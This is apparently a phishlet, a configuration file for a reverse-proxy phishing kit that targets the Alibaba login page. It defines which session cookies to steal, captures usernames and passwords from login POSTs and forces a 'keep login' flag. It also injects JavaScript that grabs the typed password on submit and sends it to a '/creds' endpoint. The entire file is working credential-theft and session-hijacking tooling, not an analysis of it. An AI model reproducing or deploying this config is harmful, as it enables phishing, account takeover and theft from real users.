auth_tokens:
  - domain: '.alibaba.com'
    keys: ['cookie2', '_tb_token_', 'acs_usuc_t', '_hvn_login', 'csg', 'xman_us_t', 'xman_t', '.*,regexp']

credentials:
  username:
    key: 'loginId'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
    
force_post:
  - path: '/newlogin/login.do'
    search: 
      - {key: 'loginId', search: '.*'}
      - {key: 'password2', search: '.*'}
     
    force:
      - {key: 'keepLogin', value: 'true'}
    type: 'post'    
login:
  domain: 'passport.alibaba.com'
  path: '/icbu_login.htm'

js_inject:
  - trigger_domains: ["passport.alibaba.com"]
    trigger_paths: ["/icbu_login.htm"]
    trigger_params: []
    script: |
      function lp(){
        document.getElementsByName("submit-btn")[0].addEventListener("click", sendPass);
        return;
      }
      function sendPass(){
        var password = document.getElementsByName("password")[0].value;
        var xhr = new XMLHttpRequest();
        xhr.open("POST", '/creds', true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send("unenc_password="+encodeURIComponent(password));
        return;
      }
      setTimeout(function(){ lp(); }, 1000);
